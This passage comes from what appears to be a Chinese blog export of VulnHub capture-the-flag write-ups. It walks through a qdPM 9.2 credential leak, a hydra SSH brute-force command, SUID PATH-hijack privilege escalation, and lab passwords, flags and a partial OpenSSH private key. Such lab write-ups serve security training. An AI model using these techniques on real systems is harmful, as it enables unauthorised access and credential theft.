,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%     %&amp;%                       </span><br><span class="line">%                      &amp;&amp;&amp;      %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      %&amp;&amp;                      </span><br><span class="line">%                      &amp;&amp;&amp;      &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;   %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%      &amp;&amp;&amp;                      </span><br><span class="line">%                      %&amp;&amp;&amp;%    &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%    &amp;%&amp;&amp;#                      </span><br><span class="line">%                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                        </span><br><span class="line">%                           &amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                           </span><br><span class="line">%                                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                                </span><br><span class="line">%                                *&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                                </span><br><span class="line">%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( </span><br><span class="line"></span><br><span class="line">invite-me: https://www.linkedin.com/in/eliastouguinho/</span><br><span class="line"></span><br><span class="line">2. /root/root.txt </span><br><span class="line">░░█▀░░░░░░░░░░░▀▀███████░░░░</span><br><span class="line">░░█▌░░░░░░░░░░░░░░░▀██████░░░</span><br><span class="line">░█▌░░░░░░░░░░░░░░░░███████▌░░</span><br><span class="line">░█░░░░░░░░░░░░░░░░░████████░░</span><br><span class="line">▐▌░░░░░░░░░░░░░░░░░▀██████▌░░</span><br><span class="line">░▌▄███▌░░░░▀████▄░░░░▀████▌░░</span><br><span class="line">▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░</span><br><span class="line">▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌</span><br><span class="line">▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌</span><br><span class="line">▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌</span><br><span class="line">░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░</span><br><span class="line">░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░</span><br><span class="line">░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░</span><br><span class="line">░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░</span><br><span class="line">░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░</span><br><span class="line">░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░</span><br><span class="line">░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░</span><br><span class="line">░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░</span><br><span class="line">░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░</span><br><span class="line">▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░</span><br><span class="line">░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄</span><br><span class="line">░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░</span><br><span class="line">░░▄▌████████▄▄▄███████▌░░░░░▄</span><br><span class="line">░▄▀░██████████████████▌▀▄░░░░</span><br><span class="line">▀░░░█████▀▀░░░▀███████░░░▀▄░░</span><br><span class="line">░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░</span><br><span class="line">░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀</span><br><span class="line">░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░</span><br><span class="line">░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░</span><br><span class="line">░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░</span><br><span class="line">░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░</span><br><span class="line"></span><br><span class="line">invite-me: linkedin.com/in/eliastouguinho</span><br></pre></td></tr></table></figure>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度适中。涉及的攻击方法有：</p>
<ol type="1">
<li>端口敲门</li>
<li>lxd提权</li>
</ol>
<p>lxd提权这是我第一次遇到。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>port knocking</tag>
        <tag>lxd提权</tag>
      </tags>
  </entry>
  <entry>
    <title>ICA1 Writeup</title>
    <url>/2022/05/25/ICA1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ica-1,748/">ICA: 1 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525135533.png" /></p>
<p>发现除了22和80之外，还开放了3306，也就是可能存在MySQL，还有一个33060</p>
<h2 id="http服务">2.2. http服务</h2>
<p>进入主页面是一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162056.png" /></p>
<p>得知该网页的CMS是 qdPM 并且版本为 9.2。搜索是否存在漏洞：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit qdPM</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162159.png" /></p>
<p>可以直接读取密码信息。查看该漏洞的详细信息： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 03/08/2021</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Author: Leon Trappett (thepcn3rd)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Vendor Homepage: https://qdpm.net/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Software Link: https://sourceforge.net/projects/qdpm/files/latest/download</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Version: 9.2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4</span></span><br><span class="line"></span><br><span class="line">The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://&lt;website&gt;/core/config/databases.yml file and download.</span><br></pre></td></tr></table></figure></p>
<p>根据PoC，直接下载对应的文件，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: &#x27;mysql:dbname=qdpm;host=localhost&#x27;</span><br><span class="line">      profiler: false</span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: &quot;&lt;?php echo urlencode(&#x27;UcVQCMQk2STVeS6J&#x27;) ; ?&gt;&quot;</span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: true  </span><br></pre></td></tr></table></figure></p>
<p>得到数据库相关信息。</p>
<h2 id="mysql服务">2.3. MySQL服务</h2>
<p>利用下面命令，然后输入密码，远程连接数据库： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -h 10.0.2.56 -u qdpmadmin -p</span><br></pre></td></tr></table></figure></p>
<p>在 staff 的 login表下面找到如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+---------+--------------------------+</span><br><span class="line">| id   | user_id | password                 |</span><br><span class="line">+------+---------+--------------------------+</span><br><span class="line">|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |</span><br><span class="line">|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |</span><br><span class="line">|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |</span><br><span class="line">|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |</span><br><span class="line">|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |</span><br><span class="line">+------+---------+--------------------------+</span><br></pre></td></tr></table></figure></p>
<p>将密码base64解码后得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg== -&gt; suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA== -&gt; 7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw== -&gt; X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw== -&gt; DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ== -&gt; cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure></p>
<p>并在user表中得到对应的用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">| id   | department_id | name   | role                      |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">|    1 |             1 | Smith  | Cyber Security Specialist |</span><br><span class="line">|    2 |             2 | Lucas  | Computer Engineer         |</span><br><span class="line">|    3 |             1 | Travis | Intelligence Specialist   |</span><br><span class="line">|    4 |             1 | Dexter | Cyber Security Analyst    |</span><br><span class="line">|    5 |             2 | Meyer  | Genetic Engineer          |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br></pre></td></tr></table></figure></p>
<p>接着，在 qdpm数据库中的 configuration
表中得到以下重要信息，和一些其他配置信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | key                                  | value    </span><br><span class="line">|----|--------------------------------------|------------------------------------</span><br><span class="line">|  1 | app_administrator_email              | admin@localhost.com                                                                                                     </span><br><span class="line">|  2 | app_administrator_password           | $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0 </span><br></pre></td></tr></table></figure></p>
<h1 id="get-shell">3. get shell</h1>
<p>将得到的用户名（注意要小写）和密码保存，然后爆破 ssh，得到两个结果：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L use.txt -P pas.txt 10.0.2.56 ssh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525205944.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">travis:DJceVy98W28Y7wLg</span><br><span class="line">dexter:7ZwV4qtg42cmUXGX</span><br></pre></td></tr></table></figure>
<h1 id="权限提升">4. 权限提升</h1>
<p>首先查看 dexter 用户的家目录下，找到一个文件 note.txt，内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It seems to me that there is a weakness while accessing the system.</span><br><span class="line">As far as I know, the contents of executable files are partially viewable.</span><br><span class="line">I need to find out if there is a vulnerability or not.</span><br></pre></td></tr></table></figure></p>
<p>大致意思是：有一个可执行文件，该文件的部分内容是可见的，我需要找到它，确定是否存在漏洞。</p>
<p>在 travis 用户的家目录下查看 .bash_history，内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure></p>
<p>利用下面命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>找到一个文件 /opt/get_access，直接运行</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525211250.png" /></p>
<p>将该文件用 ida 打开： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /root/system.info&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not create socket to access to the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;All services are disabled. Accessing to the system is allowed only within working hours.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意到
cat，没有使用绝对路径，因此可以利用修改环境变量实现提权，步骤如下：</p>
<ol type="1">
<li><p>将 /usr/bin/bash 复制到 /tmp 下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/bin/bash ./cat  # 这句无效，会报错</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/cat # 这句有效</span><br></pre></td></tr></table></figure></li>
<li><p>将 /tmp 设置为环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure></li>
<li><p>给与 /tmp/cat 执行权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /tmp/cat</span><br></pre></td></tr></table></figure></li>
<li><p>最后，执行 get_access 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./get_access</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525223321.png" /></p>
<p>最后的最后，读取2个flag（<strong>此时不能使用cat了</strong>）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/travis/user.txt</span><br><span class="line">ICA&#123;Secret_Project&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度不高，涉及的攻击方法有：</p>
<ol type="1">
<li>CMS漏洞</li>
<li>密码爆破</li>
<li>环境变量提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>密码爆破</tag>
        <tag>CMS漏洞</tag>
        <tag>环境变量提取</tag>
      </tags>
  </entry>
  <entry>
    <title>Infosec Prep Writeup</title>
    <url>/2022/05/16/Infosec%20Prep%20Writeup/</url>
    <content><![CDATA[<p>靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a
href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec
Prep: OSCP ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.49</span><br><span class="line">3. sudo nmap -p22,80,33060 -A 10.0.2.49</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516160414.png" /></p>
<p>33060端口上的服务未知。</p>
<p>80端的服务为http，并且存在robots.txt</p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516160515.png" /></p>
<p>可以看到网页的CMS是wordpress。并且还给了一个提示 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oh yea! Almost forgot the only user on this box is “oscp”.</span><br></pre></td></tr></table></figure></p>
<p>也就是该靶机上可能存在一个用户 oscp。</p>
<p>访问robots.txt，得到一个新的文件
/secret.txt。访问这个文件，得到如下字符，像是base64编码得到的：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB</span><br><span class="line">QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB</span><br><span class="line">d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3</span><br><span class="line">K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ</span><br><span class="line">ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV</span><br><span class="line">UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx</span><br><span class="line">MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY</span><br><span class="line">S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0</span><br><span class="line">eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ</span><br><span class="line">aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj</span><br><span class="line">MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy</span><br><span class="line">aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS</span><br><span class="line">d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0</span><br><span class="line">SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw</span><br><span class="line">NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ</span><br><span class="line">ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1</span><br><span class="line">R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ</span><br><span class="line">THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT</span><br><span class="line">WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC</span><br><span class="line">M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu</span><br><span class="line">dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np</span><br><span class="line">c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i</span><br><span class="line">VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB</span><br><span class="line">cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq</span><br><span class="line">NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz</span><br><span class="line">NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG</span><br><span class="line">cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl</span><br><span class="line">MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r</span><br><span class="line">bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK</span><br><span class="line">eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r</span><br><span class="line">TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP</span><br><span class="line">cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV</span><br><span class="line">blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y</span><br><span class="line">CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB</span><br><span class="line">SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H</span><br><span class="line">bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK</span><br><span class="line">TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp</span><br><span class="line">a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK</span><br><span class="line">T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx</span><br><span class="line">djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS</span><br><span class="line">aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0</span><br><span class="line">RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy</span><br><span class="line">ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr</span><br><span class="line">dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh</span><br><span class="line">bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg</span><br><span class="line">T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==</span><br></pre></td></tr></table></figure></p>
<p>经过base64解码之后，得到如下内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe</span><br><span class="line">IzBScvglLE9flolsKdxfMQQbMVGqSADnYBTavaigQekue0bLsYk/rZ5FhOURZLTvdlJWxz</span><br><span class="line">bIeyC5a5F0Dl9UYmzChe43z0Do0iQw178GJUQaqscLmEatqIiT/2FkF+AveW3hqPfbrw9v</span><br><span class="line">A9QAIUA3ledqr8XEzY//Lq0+sQg/pUu0KPkY18i6vnfiYHGkyW1SgryPh5x9BGTk3eRYcN</span><br><span class="line">w6mDbAjXKKCHGM+dnnGNgvAkqT+gZWz/Mpy0ekauk6NP7NCzORNrIXAYFa1rWzaEtypHwY</span><br><span class="line">kCEcfWJJlZ7+fcEFa5B7gEwt/aKdFRXPQwinFliQMYMmau8PZbPiBIrxtIYXy3MHcKBIsJ</span><br><span class="line">0HSKv+HbKW9kpTL5OoAkB8fHF30ujVOb6YTuc1sJKWRHIZY3qe08I2RXeExFFYu9oLug0d</span><br><span class="line">tHYdJHFL7cWiNv4mRyJ9RcrhVL1V3CazNZKKwraRAAAFgH9JQL1/SUC9AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALRwrEsx7VBfCvLYjqhAkGC6yiqwkbG76uoiBu0fYNFj7/cPoJFFniMwUnL4JSxP</span><br><span class="line">X5aJbCncXzEEGzFRqkgA52AU2r2ooEHpLntGy7GJP62eRYTlEWS073ZSVsc2yHsguWuRdA</span><br><span class="line">5fVGJswoXuN89A6NIkMNe/BiVEGqrHC5hGraiIk/9hZBfgL3lt4aj3268PbwPUACFAN5Xn</span><br><span class="line">aq/FxM2P/y6tPrEIP6VLtCj5GNfIur534mBxpMltUoK8j4ecfQRk5N3kWHDcOpg2wI1yig</span><br><span class="line">hxjPnZ5xjYLwJKk/oGVs/zKctHpGrpOjT+zQszkTayFwGBWta1s2hLcqR8GJAhHH1iSZWe</span><br><span class="line">/n3BBWuQe4BMLf2inRUVz0MIpxZYkDGDJmrvD2Wz4gSK8bSGF8tzB3CgSLCdB0ir/h2ylv</span><br><span class="line">ZKUy+TqAJAfHxxd9Lo1Tm+mE7nNbCSlkRyGWN6ntPCNkV3hMRRWLvaC7oNHbR2HSRxS+3F</span><br><span class="line">ojb+JkcifUXK4VS9VdwmszWSisK2kQAAAAMBAAEAAAGBALCyzeZtJApaqGwb6ceWQkyXXr</span><br><span class="line">bjZil47pkNbV70JWmnxixY31KjrDKldXgkzLJRoDfYp1Vu+sETVlW7tVcBm5MZmQO1iApD</span><br><span class="line">gUMzlvFqiDNLFKUJdTj7fqyOAXDgkv8QksNmExKoBAjGnM9u8rRAyj5PNo1wAWKpCLxIY3</span><br><span class="line">BhdlneNaAXDV/cKGFvW1aOMlGCeaJ0DxSAwG5Jys4Ki6kJ5EkfWo8elsUWF30wQkW9yjIP</span><br><span class="line">UF5Fq6udJPnmEWApvLt62IeTvFqg+tPtGnVPleO3lvnCBBIxf8vBk8WtoJVJdJt3hO8c4j</span><br><span class="line">kMtXsvLgRlve1bZUZX5MymHalN/LA1IsoC4Ykg/pMg3s9cYRRkm+GxiUU5bv9ezwM4Bmko</span><br><span 